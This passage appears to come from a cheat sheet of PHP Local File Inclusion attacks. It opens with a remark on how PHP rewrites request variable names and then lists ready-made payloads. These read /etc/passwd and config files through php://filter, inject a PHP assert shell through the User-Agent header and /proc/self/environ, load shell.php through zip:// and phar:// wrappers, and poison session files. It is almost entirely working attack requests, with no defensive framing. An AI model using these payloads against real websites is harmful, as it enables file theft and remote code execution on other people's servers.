The developer may want to ensure that users cannot give any query key containing underscore, because variable names with underscore often refer to private or sensitive variables.
Dots and spaces in variable names are converted to underscores. For example <input name="a.b" /> becomes $_REQUEST["a_b"].

Direct Local File Inclusion
Reading arbitrary files:

index.php?file=/etc/passwd
index.php?file=php://filter/convert.base64-encode/resource=config.php

Remote code exection:

/proc/self/environ
GET /index.php?file=/proc/self/environ&cmd=id HTTP/1.1
Host: www.site.com
User-Agent: <?php echo assert($_GET['cmd']);?>

Remote code execution:
Zip and Phar wrappers

index.php?file=zip://image.zip#shell.php
index.php?file=phar://image.phar/shell.php

Session Files

PHP5 stores session files in /var/lib/php5/sess_*
Cookie: PHPSESSID=123php # /var/lib/php5/sess_123php
index.php?file=/var/lib/php5/sess_123php

Indirect Local File Inclusion
Reading arbitrary files:

index.php?file=php://filter/convert.base64-encode/resource=config # will append ".php" at the end
